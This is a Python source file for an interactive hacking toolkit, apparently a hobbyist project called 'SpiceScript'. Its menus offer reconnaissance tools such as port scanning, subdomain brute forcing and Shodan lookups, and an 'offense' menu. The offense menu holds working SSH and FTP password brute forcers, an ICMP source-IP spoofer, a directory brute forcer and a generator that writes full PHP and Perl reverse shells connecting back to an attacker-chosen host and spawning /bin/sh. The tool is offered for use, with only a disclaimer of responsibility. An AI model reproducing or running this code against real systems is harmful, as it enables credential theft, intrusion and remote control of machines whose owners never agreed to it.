import time
time.sleep(3)
print("Starting Boot Up", end="", flush=True)
time.sleep(1)
print(" .", end="", flush=True)
time.sleep(1)
print(" .", end="", flush=True)
time.sleep(1)
print(" .", end="", flush=True)
print("\n\n\n")
try:
    bootlog = open("bootlog.txt", "r")
    Lines = bootlog.readlines()
    bootlogfound = ('\u001b[32mOK\u001b[0m')
except:
    bootlogfound = ('\u001b[31mFAILED\u001b[0m')

try:
    import os; os.system("cls")
    import socket
    import requests
    from scapy.all import *
    import json
    import shodan
    from proxyscrape import create_collector, get_collector
    import random
    import ftplib
    from paramiko import SSHClient
    import paramiko
    modulesloaded = ('\u001b[32mOK\u001b[0m')
except:
    modulesloaded = ('\u001b[31mFAILED\u001b[0m')
print("""
SpiceOS Initializing . . .
""")
time.sleep(2)
print("Boot Check List          | ", end="", flush=True)
time.sleep(1)
print(bootlogfound)
print("Boot Check List Readable | ", end="", flush=True)
time.sleep(0.6)
print(bootlogfound)
print("Modules Loaded           | ", end="", flush=True)
time.sleep(1)
print(modulesloaded)
time.sleep(1)
print("""
/bin/spicescript Loaded; Booting...""")
time.sleep(0.2)
print("""
..................................................
! I AM NOT RESPONSIBLE FOR YOUR USE OF THIS TOOL !
..................................................
""")
time.sleep(3)

if bootlogfound == '\u001b[31mFAILED\u001b[0m':
    print("\n\u001b[31mERROR\u001b[0m : Please add bootlog.txt back to your directory !")
    time.sleep(5)
    print("\n\n")
    consolemessage("Powering Off . . .")
    time.sleep(3)
    exit()


if modulesloaded == '\u001b[31mFAILED\u001b[0m':
    print("\n\u001b[31mERROR\u001b[0m : Please install requirements.txt with pip install -r requirements.txt !")
    time.sleep(5)
    exit()



banner = """\u001b[38;5;226m                                                                                             
  ██████  ██▓███   ██▓ ▄████▄  ▓█████   ██████  ▄████▄   ██▀███   ██▓ ██▓███  ▄▄▄█████▓
▒██    ▒ ▓██░  ██▒▓██▒▒██▀ ▀█  ▓█   ▀ ▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▓██░  ██▒▓  ██▒ ▓▒
░ ▓██▄   ▓██░ ██▓▒▒██▒▒▓█    ▄ ▒███   ░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▒ ▓██░ ▒░
  ▒   ██▒▒██▄█▓▒ ▒░██░▒▓▓▄ ▄██▒▒▓█  ▄   ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ 
▒██████▒▒▒██▒ ░  ░░██░▒ ▓███▀ ░░▒████▒▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒░██░▒██▒ ░  ░  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░▓  ░ ░▒ ▒  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░  ▒ ░░   
░ ░▒  ░ ░░▒ ░      ▒ ░  ░  ▒    ░ ░  ░░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░ ▒ ░░▒ ░         ░    
░  ░  ░  ░░        ▒ ░░           ░   ░  ░  ░  ░          ░░   ░  ▒ ░░░         ░      
      ░            ░  ░ ░         ░  ░      ░  ░ ░         ░      ░                    
                      ░                        ░                                         
                      ░                                    \u001b[38;5;200m
┌──────────────────────────────────────────────────────────────────────────────────────────────►
| \u001b[0mDeveloped By @SpiceSouls#6969\u001b[38;5;200m
└─────────────────────────────────────────────────────────────────────────────►\u001b[36m """                                                                                            



def ipgeolocate(ip):
        print("\nLocating \u001b[38;5;208m" + str(ip) + "\u001b[0m...")
        ipinfo = requests.get('http://api.hackertarget.com/geoip/?q=' + str(ip))
        print("\n" + ipinfo.text)
        print("- Geolocation Finished -")       
        input("Press ENTER To Go Back.")

def portscanner(ip):
        print("\nScanning ports for \u001b[38;5;208m" + str(ip) + "\u001b[0m...\nPress CNTRL + C At Any Time To End the Scan!")
        openlist = []
        try:
            for port in range(1,1025):  
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    print("[\u001b[32mOPEN\u001b[0m] Port {}".format(port))
                    openlist.append(port)
                else:
                    print("[\u001b[31mCLOSED\u001b[0m] Port {}".format(port))
                sock.close()
        except socket.gaierror:
            print('ERROR: Hostname could not be resolved.')

        except socket.error:
            print("ERROR: Couldn't connect to server.")



        except KeyboardInterrupt:
            pass

        print("\n\n--- SCAN FINISHED ---\n\nOpen Ports\n")
        for i in range(len(openlist)):
            print("[\u001b[32mOPEN\u001b[0m] Port {}".format(openlist[i]))
        input("\nPress ENTER To Go Back.")

def reversedns(dns):
        print("Reversing DNS For \u001b[38;5;208m" + str(dns) + "\u001b[0m...")
        r = requests.get('http://api.hackertarget.com/dnslookup/?q=' + dns)
        print("\n" + r.text)
        print("- DNS Reversing Finished -")
        input("Press ENTER To Go Back.")

def sitescanner(dns):
        print("Scanning \u001b[38;5;208m" + str(dns) + "\u001b[0m for links...")
        r = requests.get('https://api.hackertarget.com/pagelinks/?q=' + dns)
        print("\n" + r.text)
        print('- Scan Finished -')
        input("Press ENTER To Go Back.")

def bannergrabber(ip):
        print("Grabbing the banner of \u001b[38;5;208m" + ip + "\u001b[0m...")
        r = requests.get('https://api.hackertarget.com/bannerlookup/?q=' + ip)
        print("\n" + r.text)
        print('- Scan Finished -')
        input('Press ENTER To Go Back.')

def phonenumberlookup(numberstring):
        print("Looking up number \u001b[38;5;208m" + str(numberstring) + "\u001b[0m...")
        r = requests.get('https://api.telnyx.com/v1/phone_number/' + numberstring)
        print("\n" + r.text)
        print("- Look up Finished -")
        input("Press ENTER To Go Back.")


def anonftplogin(hostname):
        try:
            ftp = ftplib.FTP(hostname)
            consolemessage('Attempting to connect to ' + str(hostname) + '...')
            ftp.login('anonymous', 'me@your.com')
            consolemessage('FTP Anonymous Login Succeeded')
            ftp.quit()
            input("Press ENTER To Go Back.")
            return True
        except:
            consolemessage('FTP Anonymous Login Failed')
            input("Press ENTER To Go Back.")
            return False

def shodanlookup():
        try:
                ip = input("Enter the Target IP : ")
                shodankey = input("Enter your Shodan API Key : ")
                api = Shodan(shodankey)
                ipinfo = api.host(ip)
                consolemessage('Collecting Information...')
                ipinfoports = str(ipinfo['ports'])
                print("""\n
IP         : """ + str(ip) + """
ISP        : """ + ipinfo['isp'] + """
Location   : """ + ipinfo['region_code'] + """
City       : """ + ipinfo['city'] + """
Open Ports : """ + ipinfoports)
                input("\nPress ENTER To Go Back.")
        except:
                consolemessage('Shodan Lookup Failed')
                input("Press ENTER To Go Back.")



def scrapeproxies(proxytype):
    collector = create_collector('generatedfromcollector', [proxytype])
    proxycount = int(input("\nHOW MANY PROXIES WOULD YOU LIKE TO GENERATE?\n> "))
    print("\nScraping Proxies...\n")
    time.sleep(1)
    proxyprinted = 0
    proxyloop = True
    while proxyloop == True:
        proxy = collector.get_proxy()
        print("\u001b[32mSuccesfully\u001b[0m Scraped : " + str(proxy.host) + ":" + str(proxy.port))
        proxyprinted = proxyprinted + 1
        if proxyprinted == proxycount:
            proxyloop = False
    print("\nScraping Finished!")
    eee = input("Press ENTER To Go Back.")





def flushletters(word):
        for letter in word:
                print(letter, end="", flush=True)
                time.sleep(0.1)

def consolemessage(message):
        print("[\u001b[38;5;208mSpiceScript\u001b[0m]\u001b[38;5;50m─►\u001b[0m " + str(message))



def clear():
        print("\n" * 300)


def boot():
        



        for line in Lines:
                print(line.strip())
                time.sleep(0.01)


        clear()
        print(banner, end="", flush=True)
        time.sleep(3)
        flushletters("Version 4.0.0")
        print("\u001b[0m")

        






try:
        boot()
        loop = True
        while loop == True:
                firstchoice = str(input("""
\u001b[38;5;50m┌\u001b[0m[\u001b[38;5;208m01\u001b[0m] Spicy Enumeration
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m02\u001b[0m] Spicy Offense
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m03\u001b[0m] Spicy Proxies
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m04\u001b[0m] Other
\u001b[38;5;50m|\u001b[0m[ \u001b[38;5;226mCNTRL + C TO EXIT\u001b[0m ]\u001b[38;5;50m
|
└──\u001b[38;5;208musr@spice.script\u001b[38;5;50m──►\u001b[0m """))
        

                if firstchoice == "4":
                    funchoice = str(input("""
\u001b[38;5;50m┌\u001b[0m[\u001b[38;5;208m01\u001b[0m] Matrix Screen
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m02\u001b[0m] Mr Robot Screen
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m99\u001b[0m] Back
\u001b[38;5;50m|\u001b[0m[ \u001b[38;5;226mCNTRL + C TO EXIT\u001b[0m ]\u001b[38;5;50m
|
└──\u001b[38;5;208musr@spice.script/other\u001b[38;5;50m──►\u001b[0m """))
                    
                    if funchoice == "1":
                        input("\n\nPress CNTRL + C To Exit at any time.\nPress ENTER To Continue")
                        print("\u001b[32m")
                        while True:
                            randombinary = random.randint(0, 1)
                            print(randombinary, end="", flush=True)

                    if funchoice == "2":
                        input("\n\nPress CNTRL + C To Exit at any time.\nPress ENTER To Continue")
                        while True:
                            whitetext = random.randint(1, 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
                            redtext = random.randint(1, 999999999999999999999999999999999999999999999999999999999999)
                            print(str(whitetext) + '\u001b[31m' + str(redtext) + '\u001b[0m', end="", flush=True)
                            time.sleep(0.04)
                
                
                if firstchoice == "1":          
                        infosecchoice = str(input("""
\u001b[38;5;50m┌\u001b[0m[\u001b[38;5;208m01\u001b[0m] IP Geolocator
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m02\u001b[0m] Port Scanner
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m03\u001b[0m] Reverse DNS
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m04\u001b[0m] Site Scanner
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m05\u001b[0m] Banner Grabber
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m06\u001b[0m] Phone Number Lookup
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m07\u001b[0m] Site Spider
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m08\u001b[0m] Subdomain Bruteforcer
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m09\u001b[0m] Shodan Search
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m99\u001b[0m] Back
\u001b[38;5;50m|\u001b[0m[ \u001b[38;5;226mCNTRL + C TO EXIT\u001b[0m ]\u001b[38;5;50m
|
└──\u001b[38;5;208musr@spice.script/spicy.enumeration\u001b[38;5;50m──►\u001b[0m """))

                        if infosecchoice == "1":
                                ip = input("\n\u001b[38;5;50mIP GEOLOCATER\u001b[0m\n\nWhat IP Would You Like To Locate : ")
                                ipgeolocate(ip)
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")
                        if infosecchoice == "2":
                                ip = input("\n\u001b[38;5;50mPORT SCANNER\u001b[0m\n\nWhat IP Would You Like To Scan : ")
                                portscanner(ip)
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")
                        if infosecchoice == "3":
                                dns = input("\n\u001b[38;5;50mREVERSE DNS\u001b[0m\n\nWhat DNS Would You Like To Reverse : ")
                                reversedns(dns)
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")
                        if infosecchoice == "4":
                                dns = input("\n\u001b[38;5;50mSITE SCANNER\u001b[0m\n\nWhat Website Would You Like To Scan : ")
                                sitescanner(dns)
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")
                        if infosecchoice == "5":
                                dns = input("\n\u001b[38;5;50mBANNER GRABBER\u001b[0m\n\nWhere Would You Like To Grab A Banner From : ")
                                bannergrabber(dns)
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")
                        if infosecchoice == "6":
                                number = input("\n\u001b[38;5;50mPHONE NUMBER LOOKUP\u001b[0m\n\nWhat Number Would You Like To Reverse [FORMAT: '+447410490080 / +44 Is My Dialing Code'] : ")
                                phonenumberlookup(number)
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")
                        if infosecchoice == "7":
                                domain1 = input("\n\u001b[38;5;50mSITE SPIDER\u001b[0m\n\nWhat site would you like to web off of? : ")
                                print("Sewing the web for " + str(domain1) + "...")
                                r = requests.get('http://tls.bufferover.run/dns?q=' + str(domain1))
                                result = json.loads(r.content)
                                resultmeta = result['Meta']
                                print("Completed in " + str(resultmeta["Runtime"]))
                                resultsarray = result["Results"]
                                w = open(str(domain1) + '.txt', 'w')
                                print("--- \u001b[32mSTART OF RESULTS\u001b[0m ---")
                                try:
                                    for i in range(0, len(resultsarray)):
                                        print(resultsarray[i])
                                        w.write(resultsarray[i] + '\n')
                                except:
                                    print("Error: No Results Found")
                                print("--- \u001b[32mEND OF RESULTS\u001b[0m ---")
                                print("\nWritten to \u001b[32m" + str(domain1) + ".txt\u001b[0m!")
                                w.close()
                                input("Press ENTER To Go Back.")
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")
                        if infosecchoice == "8":
                            domain = input("\n\u001b[38;5;50mSUBDOMAIN BRUTE FORCER\u001b[0m\n\nWhat domain would you like to brute force for subdomains? : ")
                            wordlist = input("What is the filepath to the wordlist you would like to use? : ")
                            print("Starting now...")
                            with open(wordlist, "r") as list:
                              for line in list:
                                directoryaddon = line.strip()
                                try:
                                    r = requests.get('https://' + directoryaddon + '.' + domain)
                                    print('[\u001b[32m+\u001b[0m] ' + directoryaddon + '.' + domain)
                                except:
                                    pass
                              list.close()
                            print('- Scan Finished -')
                            input("Press ENTER To Go Back.")
                            clear()
                            print(banner, end="", flush=True)
                            time.sleep(3)
                            flushletters("Version 4.0.0")
                            print("\u001b[0m")


                        if infosecchoice == "9":
                                shodanlookup()
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")



                        if infosecchoice == "99":
                                pass




                if firstchoice == "2":
                        weaponlabchoice = str(input("""
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m01\u001b[0m] Anonymous FTP Connection
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m02\u001b[0m] Ping Source Spoofer
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m03\u001b[0m] Site Directory Brute Forcer
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m04\u001b[0m] SSH Credential Brute Forcer
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m05\u001b[0m] FTP Credential Brute Forcer
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m06\u001b[0m] Reverse Shell Generator
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m07\u001b[0m] Wordlist Generator
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m99\u001b[0m] Back
\u001b[38;5;50m|\u001b[0m[ \u001b[38;5;226mCNTRL + C TO EXIT\u001b[0m ]\u001b[38;5;50m
|
└──\u001b[38;5;208musr@spice.script/spicy.offense\u001b[38;5;50m──►\u001b[0m """))                      



                        if weaponlabchoice == "1":
                                host = input("\n\u001b[38;5;50mANONYMOUS FTP CONNECTOR\u001b[0m\n\nWhat Host Would You Like to Connect To? : ")
                                anonftplogin(host)
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")

                        if weaponlabchoice == "2":
                            destination = input("\n\u001b[38;5;50mPING SOURCE SPOOFER\u001b[0m\n\nWhat Host Would You Like to Ping? : ")
                            source = input("What would you like to Spoof the Source IP To Be? : ")
                            print('Pinging ' + str(destination) + ' spoofing ourselves as ' + str(source) + '...')
                            icmp = IP(dst=str(destination), src=str(source))/ICMP()
                            resp = sr1(icmp,timeout=10)
                            if resp == None:
                                print("[\u001b[31m-\u001b[0m] No response, Host may be down.")
                            else:
                                print("[\u001b[32m+\u001b[0m] Success! The spoofed packet has been sent and acknowledged!")
                            input('\nPress ENTER To Go Back.')
                            clear()
                            print(banner, end="", flush=True)
                            time.sleep(3)
                            flushletters("Version 4.0.0")
                            print("\u001b[0m")
                        if weaponlabchoice == "3":
                            site = input("\n\u001b[38;5;50mSITE DIRECTORY SCANNER\u001b[0m\n\nWhat site would you like to scan : ")
                            wordlist = input("What wordlist would you like to use : ")
                            consolemessage('Starting scan...')
                            with open(wordlist, "r") as list:
                              for line in list:
                                directoryaddon = line.strip()
                                r = requests.get(site + "/" + directoryaddon)
                                if r.status_code == 200:
                                    print('[\u001b[32m+\u001b[0m] ' + site + '/' + directoryaddon)
                                if r.status_code == 303:
                                    print('[\u001b[32m+\u001b[0m] ' + site + '/' + directoryaddon)
                                if r.status_code == 300:
                                    print('[\u001b[32m+\u001b[0m] ' + site + '/' + directoryaddon)
                                if r.status_code == 203:
                                    print('[\u001b[32m+\u001b[0m] ' + site + '/' + directoryaddon)
                                if r.status_code == 206:
                                    print('[\u001b[32m+\u001b[0m] ' + site + '/' + directoryaddon)
                              list.close()
                            print('- Scan Finished -')
                            input("Press ENTER To Go Back.")
                            clear()
                            print(banner, end="", flush=True)
                            time.sleep(3)
                            flushletters("Version 4.0.0")
                            print("\u001b[0m")
                            

                        if weaponlabchoice == "4":
                            target = str(input("\n\u001b[38;5;50mSSH CREDENTIAL BRUTE FORCER\u001b[0m\n\nWhat is the IP Address of the target? : "))
                            username = input("What username would you like to use? : ")
                            wordlist = input("What is the file path of the wordlist you would like to use? : ")
                            print("Brute Forcing the credentials for " + str(username) + "@" + str(target) + "...")
                            with open(wordlist, "r") as list:
                                for line in list:
                                    password = line.strip()
                            
                                    client = paramiko.SSHClient()
                                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                    try:
                                        client.connect(hostname=target, username=username, password=password, timeout=100, banner_timeout=200)
                                    except paramiko.AuthenticationException:
                                        print("[\u001b[31m-\u001b[0m] " + username + '@' + target + ':' + password)
                                    except paramiko.ssh_exception.SSHException:
                                        time.sleep(60)
                                    except ConnectionResetError:
                                        print("Connection Forcibly Closed By Host.\n")
                                        break
                                    else:
                                        print("\n\nLogin Found!\n[\u001b[32m+\u001b[0m] " + username + '@' + target + ':' + password + '\n')
                                        break
                                
                            input("Press ENTER To Go Back.")
                            clear()
                            print(banner, end="", flush=True)
                            time.sleep(3)
                            flushletters("Version 4.0.0")
                            print("\u001b[0m")

                        
                        if weaponlabchoice == "5":
                            host = str(input("\n\u001b[38;5;50mFTP CREDENTIAL BRUTE FORCER\u001b[0m\n\nWhat FTP Host would you like to brute force the credentials to? : "))
                            username = input("What username would you like to use? : ")
                            wordlist = input("What is the file path of the wordlist you would like to use? : ")
                            print("Brute Forcing the FTP credentials for " + str(username) + "@" + str(host) + "...")
                            with open(str(wordlist), 'r') as list:
                                for line in list:
                                    try:
                                        password = line.strip()
                                        ftp = ftplib.FTP(host)
                                        ftp.login(str(username), str(password))
                                        ftp.quit()
                                    except ftplib.error_perm:
                                        print("[\u001b[31m-\u001b[0m] " + str(username) + '@' + str(host) + ':' + str(password))
                                    
                                    else:
                                        print("\n\nLogin Found!\n[\u001b[32m+\u001b[0m] " + str(username) + '@' + str(host) + ':' + str(password) + '\n')
                                        break
                            input("Press ENTER To Go Back.")
                            clear()
                            print(banner, end="", flush=True)
                            time.sleep(3)
                            flushletters("Version 4.0.0")
                            print("\u001b[0m")


                        if weaponlabchoice == "6":
                            shellchoice = str(input("\n\u001b[38;5;50mREVERSE SHELL GENERATOR\u001b[0m\n\nWhat kind of reverse shell would you like to generate?\n\n[1] PHP\n[2] Perl\n\n : "))

                            if shellchoice == "1":
                                ip = input("What IP Would you like this shell to connect back to? : ")
                                port = input("What Port would you like this shell to connect back to? : ")
                                print("Generating a Reverse PHP Shell...")
                                time.sleep(0.5)
                                phpshell = """
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '""" + str(ip) + """';
$port = """ + str(port) + """; 
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>             
"""
                                w = open("php-reverse-shell.php", "w")
                                w.write(phpshell)
                                w.close()
                                print("Success! Reverse PHP Shell written to \u001b[33mphp-reverse-shell.php\u001b[0m")
                                input("Press ENTER To Go Back.")
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")

                            if shellchoice == "2":
                                ip = input("What IP Would you like this shell to connect back to? : ")
                                port = input("What Port would you like this shell to connect back to? : ")
                                print("Generating a Reverse Perl Shell...")
                                time.sleep(0.5)
                                perlshell = """
#!/usr/bin/perl -w
use Socket;
$i='""" + str(ip) + """';
$p=""" + str(port) + """;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
};"""
                                w = open("perl-reverse-shell.pl", "w")
                                w.write(perlshell)
                                w.close()
                                print("Success! Reverse Shell Shell written to \u001b[33mperl-reverse-shell.pl\u001b[0m")
                                input("Press ENTER To Go Back.")
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")

                            else:
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")

                            
                        if weaponlabchoice == "7":
                            keywords = []
                            print("\n\u001b[38;5;50mWORDLIST GENERATOR\u001b[0m\n\nEnter any keywords you would like to use and press CNTRL + C once you are done. ")
                            try:
                                while True:
                                    keyword = input(": ")
                                    keywords.append(str(keyword))
                            except:
                                print("\nGenerating Wordlist...")
                                with open('generated_wordlist.txt', 'w') as file:
                                    for i in range(len(keywords)):
                                        for l in range(len(keywords)):
                                            file.write(str(keywords[i]) + str(keywords[l]) + '\n')
                                            print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(keywords[l]))
                                            for n in range(1,1000):    
                                                file.write(str(keywords[i]) + str(n) + '\n')
                                                print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(n))
                                                file.write(str(n) + str(keywords[i]) + '\n')
                                                print('\u001b[32mWritten\u001b[0m ' + str(n) + str(keywords[i]))

                                                file.write(str(keywords[i]) + str(keywords[l]) + str(n) + '\n')
                                                print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(keywords[l]) + str(n))
                                                file.write(str(n) + str(keywords[i]) + str(keywords[l]) + '\n')
                                                print('\u001b[32mWritten\u001b[0m ' + str(n) + str(keywords[i]) + str(keywords[l]))

                                    file.close()
                            input("Finished! Written to generated_wordlist.txt!\n\nPress ENTER To Go Back.")
                            clear()
                            print(banner, end="", flush=True)
                            time.sleep(3)
                            flushletters("Version 4.0.0")
                            print("\u001b[0m")

                                



                        if weaponlabchoice == "99":
                            pass

                if firstchoice == "3":

                        proxieschoice = str(input("""
\u001b[38;5;50m┌\u001b[0m[\u001b[38;5;208m01\u001b[0m] HTTP
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m02\u001b[0m] Socks4
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m03\u001b[0m] Socks5
\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m99\u001b[0m] Back
\u001b[38;5;50m|\u001b[0m[ \u001b[38;5;226mCNTRL + C TO EXIT\u001b[0m ]\u001b[38;5;50m
|
└──\u001b[38;5;208musr@spice.script/proxies\u001b[38;5;50m──►\u001b[0m """)) 
            
                        if proxieschoice == "1":
                                scrapeproxies('http')
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")

                        if proxieschoice == "2":
                                scrapeproxies('socks4')
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")     


                        if proxieschoice == "3":
                                scrapeproxies('socks5')
                                clear()
                                print(banner, end="", flush=True)
                                time.sleep(3)
                                flushletters("Version 4.0.0")
                                print("\u001b[0m")

except KeyboardInterrupt:
        print("\u001b[0m\n\n")
        consolemessage("Powering Off . . .")
        time.sleep(3)
